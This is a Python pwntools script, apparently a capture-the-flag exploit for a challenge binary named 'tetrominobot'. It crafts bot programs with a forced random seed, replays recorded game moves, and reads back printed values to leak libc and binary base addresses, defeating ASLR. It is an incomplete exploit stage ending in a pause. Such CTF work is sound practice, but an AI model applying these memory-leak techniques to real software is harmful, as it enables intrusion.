from pwn import *
from functools import reduce

# context.aslr = False
# context.log_level = "debug"
context.log_level = "info"

def spawn_process(): # as the server runs it
    return process(["./out/handout/ld-linux-x86-64.so.2", "--library-path", \
                    "./out/handout", "./out/handout/tetrominobot"])

SEED_SIZE = 2 ** 16;
GOAL_SRAND = 0

def prog_sum(prog):
    return reduce(lambda a, c: a + c, prog, 0) % SEED_SIZE

def srand_override(prog):
    # EOF char = 4, newline = 10 (will not work with cmdline -b prog)
    todo = (GOAL_SRAND + SEED_SIZE - (prog_sum(prog) + 10 + 4)) % SEED_SIZE
    return prog + b'' \
        + b''.join([b'~' for i in range(todo // ord('~'))]) \
        + bytes([todo % ord('~')])

# played manually with srand 0 searching for addresses, logging inputs
cmdlog_ceiling = b"=== g  g--.ad-d---d-d=dda=d=d=dd=d.."
cmdlog_tspin = b"d----   g    gw===    -g====s.wd==.-.w--a   a.g"

"""
mem[0] = string address
mem[1] = callable address
mem[2] = 0 (segfault barrier)
mem[4] = global counter
mem[5] = f return value

"""

# i lose hair writing python
def cmd_to_call(b):
    match chr(b):
        case '-':
            return b"left"
        case '=':
            return b"right"
        case '.':
            return b"drop"
        case 'w':
            return b"hold"
        case 'a':
            return b"rot_l"
        case 's':
            return b"rot_180"
        case 'd':
            return b"rot_r"
        case ' ':
            return b"down"
        case 'g':
            return b"commit"
        case _:
            return b"die"

def cmd_to_cond(i, cmd):
    return b'if (mem[4] == ' \
        + bytes(str(i), 'utf-8') \
        + b') { mem[5] = call(' \
        + cmd_to_call(cmd) \
        + b'); } '

def wrap_curly(bs):
    return b'{' + bs + b'}'

def str_to_prog(bs):
    cond_move = b''.join(map(cmd_to_cond, range(len(bs)), bs))
    increment_counter = b'mem[4] = mem[4] + 1; '
    p_mem = b'if (mem[5] > 7) {print(88888888888888); print(mem[4]); print(mem[5]);} '

    p1 = wrap_curly(cond_move + increment_counter + p_mem)
    return srand_override(p1)
# return srand_override(b'{call(drop)}')

def pwn_send_bot(p, bot):
    p.recvuntil(b'> ')
    p.sendline(b"-d_name")
    p.recvuntil(b'> ')
    p.sendline(bot)
    debug_prints = p.recvuntil(b"+------------+--------------------+------------+", drop=True)
    board = p.recvuntil(b"Score: ")
    score = p.recvuntil(b'\n')
    log.info(debug_prints)
    log.info(board)
    log.info(b"py rcved score: " + score)
    p.recvuntil(b'> ')
    p.sendline(b'y')
    return (debug_prints, score)

def pwn_1_find_libc(p):
    (ceiling_prints, _) = pwn_send_bot(p, str_to_prog(cmdlog_ceiling))
    ceiling_prints = ceiling_prints.split(b'\n')[2:-2]
    log.info(ceiling_prints)
    libc_u = libc_l = b''
    for i in range(len(ceiling_prints) // 3):
        (eights, mem4ctr, mem5retval) = ceiling_prints[i*3:i*3+3]
        if eights != b'88888888888888':
            print(b"probably wrong: " + eights)
        if mem4ctr == b'14':
            libc_u = int(mem5retval)
        if mem4ctr == b'19':
            libc_l = int(mem5retval)

    # todo add whatever useful offset
    libc = (libc_u << 32) + libc_l
    return libc

def pwn_2_find_bin(p):
    (_, tsp_score) = pwn_send_bot(p, str_to_prog(cmdlog_tspin))
    return  int(tsp_score)


def main():
    p = spawn_process()

    print(str_to_prog(cmdlog_ceiling))

    libc = pwn_1_find_libc(p)
    bin_addr = pwn_2_find_bin(p)

    # i think this works exactly half the time; when the middle bit of the addr is 0
    log.info("libc: " + hex(libc))
    log.info("tetrominobot addr: " + hex(bin_addr))
    print(p.pid)
    pause()



    p.close()

main()
